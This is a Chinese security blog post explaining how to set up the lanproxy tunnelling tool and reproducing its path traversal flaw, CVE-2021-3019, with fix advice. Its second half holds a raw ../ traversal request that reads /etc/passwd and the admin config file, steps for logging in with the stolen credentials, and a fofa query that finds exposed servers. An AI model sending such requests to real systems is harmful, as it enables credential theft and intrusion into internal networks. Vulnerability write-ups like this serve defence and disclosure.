![](https://image.3001.net/images/20210112/1610419427_5ffd0ce3ddc80c4fda61f.jpg!small)

## lanproxy配置过程

lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议，可用于访问内网网站、本地支付接口调试、ssh访问、远程桌面等等，而且带有Web在线管理面板，添加端口配置十分简单。目前市面上提供类似服务的有花生壳、TeamView、GoToMyCloud等等，但要使用第三方的公网服务器就必须为第三方付费，并且这些服务都有各种各样的限制，此外，由于数据包会流经第三方，因此对数据安全也是一大隐患。

我一直都在使用lanproxy工具进行内网穿透，但是在前两天lanproxy却爆了一个路径遍历漏洞（CVE-2021-3019）。该漏洞可以读取服务器上的任意文件，甚至可以可直接获取到lanproxy配置文件，从而获取内部网连接的凭据登录lanproxy管理后台面板直接进入内网操纵内网主机。

该漏洞构造非常简单，下面我将演示如何搭建lanproxy内网穿透，并进行该漏洞的复现。

 **lanproxy下载：**

  * 项目地址：<https://github.com/ffay/lanproxy>

  * 或直接下载发布包 <https://file.nioee.com/d/2e81550ebdbd416c933f/>

### 服务端配置

lanproxy的服务端应安装在一个具有公网IP的服务器上。

  * 拉取源码，运行 mvn package，打包后的资源放在distribution目录中，包括client和server

  * 或直接下载发布包 <https://file.nioee.com/d/2e81550ebdbd416c933f/>

这里我们直接下载发布版。将下载的服务器端程序的发布包 [proxy-server-0.1.zip](https://file.nioee.com/d/2e81550ebdbd416c933f/files/?p=/proxy-server-0.1.zip)解压后放置在公网vps上。然后进入到proxy-server-0.1/conf目录编辑修改服务器端配置文件config.properties，config.properties的配置参考如下：

    
    
    server.bind=0.0.0.0  
    ​  
    #与代理客户端通信端口  
    server.port=4900  
    ​  
    #ssl相关配置  
    server.ssl.enable=true  
    server.ssl.bind=0.0.0.0  
    server.ssl.port=4993  
    server.ssl.jksPath=test.jks  
    server.ssl.keyStorePassword=123456  
    server.ssl.keyManagerPassword=123456  
    ​  
    #这个配置可以忽略  
    server.ssl.needsClientAuth=false  
    ​  
    #WEB在线配置管理相关信息  
    config.server.bind=0.0.0.0  
    config.server.port=8090  
    config.admin.username=admin  # WEB在线配置管理面板登录用户名  
    config.admin.password=657260  # WEB在线配置管理面板登录密码

配置完后运行lanproxy：

    
    
    cd proxy-server-0.1/bin  
    chmod +x startup.sh  
    nohup ./startup.sh &

若公网服务器为Windows系统，则只需运行startup.bat程序。

![image-20210111232716026](https://image.3001.net/images/20210112/1610409099_5ffce48b585d0ae9525ed.png!small)

然后我们访问vps的8090端口，使用上面配置中配置的用户名admin和密码657260进行登录即可进入lanproxy的WEB管理面板：

![image-20210111232956789](https://image.3001.net/images/20210112/1610409100_5ffce48c5897309f9f92a.png!small)

![image-20210111233035213](https://image.3001.net/images/20210112/1610409101_5ffce48db685b83191c2a.png!small)

我们可以在添加客户端选项中添加一个需要进行映射的内网主机，如下图填写客户端名称和随机生成客户端秘钥后点击提交即可添加一个客户端：

![image-20210111234949821](https://image.3001.net/images/20210112/1610409103_5ffce48f1d90d443ed2d6.png!small)

![image-20210111235113408](https://image.3001.net/images/20210112/1610409104_5ffce49068af4227a3e87.png!small)

这里的客户端密钥在之后配置客户端时会用到。

### 客户端配置

客户端下载我们同样使用发布包：<https://seafile.cdjxt.net/d/2e81550ebdbd416c933f>

客户端一般安装在一个内网的Linux服务器或内网Windows电脑上。并且需要具备java1.7及以上的环境。

我们在内网客户端Linux主机上下载lanproxy的客户端程序 [proxy-java-client-0.1.zip](https://file.nioee.com/d/2e81550ebdbd416c933f/files/?p=/proxy-java-client-0.1.zip)，同样还是进入到proxy-java-client-0.1/conf目录编辑修改客户端配置文件config.properties，config.properties的配置参考如下：

    
    
    #与在proxy-server配置后台创建客户端时填写的秘钥保持一致；  
    client.key=8dfeb0db68c2400a8c0d30395abb65e2  
    ssl.enable=true  
    ssl.jksPath=test.jks  
    ssl.keyStorePassword=123456  
    ​  
    #这里填写实际的proxy-server地址；没有服务器默认即可，自己有服务器的更换为自己的proxy-server（IP）地址  
    #server.host=lp.thingsglobal.org  
    server.host=47.xxx.xxx.72  
    ​  
    #proxy-server ssl默认端口4993，默认普通端口4900  
    #ssl.enable=true时这里填写ssl端口，ssl.enable=false时这里填写普通端口  
    server.port=4993

配置完成后运行lanproxy客户端：

    
    
    cd proxy-java-client-0.1/bin  
    chmod +x startup.sh  
    nohup ./startup.sh &

如果客户端是Windows系统，则直接双击bin目录下的startup.bat即可。

![image-20210111235332301](https://image.3001.net/images/20210112/1610409105_5ffce491b2752e2e88651.png!small)

此时，便可以在服务端控制面板的配置管理中对内网主机进行代理配置了：

![image-20210111235729875](https://image.3001.net/images/20210112/1610409107_5ffce4933a51ccdcda110.png!small)

如上图所示，我们将内网主机Debian的22端口映射到了公网vps的2222端口上，也就是说我们访问公网vps的2222端口就相当于访问内网主机Debian的22端口。如下，我们通过公网vps的2222端口来通过ssh连接内网主机：

    
    
    ssh root@47.xxx.xxx.72 -p 2222

![image-20210112000335850](https://image.3001.net/images/20210112/1610409109_5ffce495ac2b573e66ff9.png!small)

如上图所示，连接成功。

## 漏洞复现

该漏洞可以读取服务器上的任意文件，甚至可以可直接获取到lanproxy配置文件，从而获取登录用户名与密码登录lanproxy管理后台面板直接进入内网操纵内网主机。

 **影响版本**

  * lanproxy 0.1

我们访问lanproxy的控制面板，抓包并构造恶意请求，读取目标主机上的任意文件：

    
    
    GET /../../../../../../../../../etc/passwd HTTP/1.1
    Host: 47.xxx.xxx.72:8090
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close

![image-20210111124215992](https://image.3001.net/images/20210112/1610409412_5ffce5c484e38de2afebc.png!small)

如上图所示，读取成功。

下面我们读取lanproxy的config配置文件：

    
    
    /../conf/config.properties

![image-20210111124606413](https://image.3001.net/images/20210112/1610409464_5ffce5f8298de1986dbdb.png!small)

如上图所示，读取成功。

我们利用读取到的配置文件中的用户名和密码，可直接在管理后台进行登录，从而访问内网，如下图所示，成功登录：

![1610409505_5ffce6212cd60c0b77f21.png!small?1610409505161](https://image.3001.net/images/20210112/1610409505_5ffce6212cd60c0b77f21.png!small?1610409505161)

### 修复建议

  * 建议禁止将lanproxy管理面板对外部开放。

  * 目前lanproxy厂商已发布升级补丁以修复漏洞，补丁获取链接：<https://github.com/ffay/lanproxy/commits/master>

在fofa上用如下fofa语法搜索暴露在公网上的lanproxy：

    
    
    header= "Server: LPS-0.1"

![1610409582_5ffce66ec96d5467bd4c2.png!small](https://image.3001.net/images/20210112/1610409582_5ffce66ec96d5467bd4c2.png!small)

如上图所示，总共可以发现2029条数据。

## Ending......

![](https://image.3001.net/images/20210112/1610419349_5ffd0c95cf0eb65c73ac1.jpg!small)

> 参考：
>
> <https://www.moerats.com/archives/727/>
>
>
> <http://www.kekefund.com/2018/06/24/lanproxy/#2%EF%BC%8CJava%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE>
>
> <http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202101-275>
>
>
> [http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==∣=2247489409&idx=1&sn=43c89f02920d6417c8dea45c437281a5&chksm=f9e00110ce978806b2183fa1f2ff26c1906a3eee4305e7de30e92718c60a802fcda26574b2c4&mpshare=1&scene=23&srcid=0111AQnphEMsg6crfeEOh5iv&sharer_sharetime=1610336571217&sharer_shareid=fb28a23f5efa30b40dcc9905f48f84bf#rd﻿](http://mp.weixin.qq.com/s?__biz=MzUyMTAyODYwNg==&mid=2247489409&idx=1&sn=43c89f02920d6417c8dea45c437281a5&chksm=f9e00110ce978806b2183fa1f2ff26c1906a3eee4305e7de30e92718c60a802fcda26574b2c4&mpshare=1&scene=23&srcid=0111AQnphEMsg6crfeEOh5iv&sharer_sharetime=1610336571217&sharer_shareid=fb28a23f5efa30b40dcc9905f48f84bf#rd)

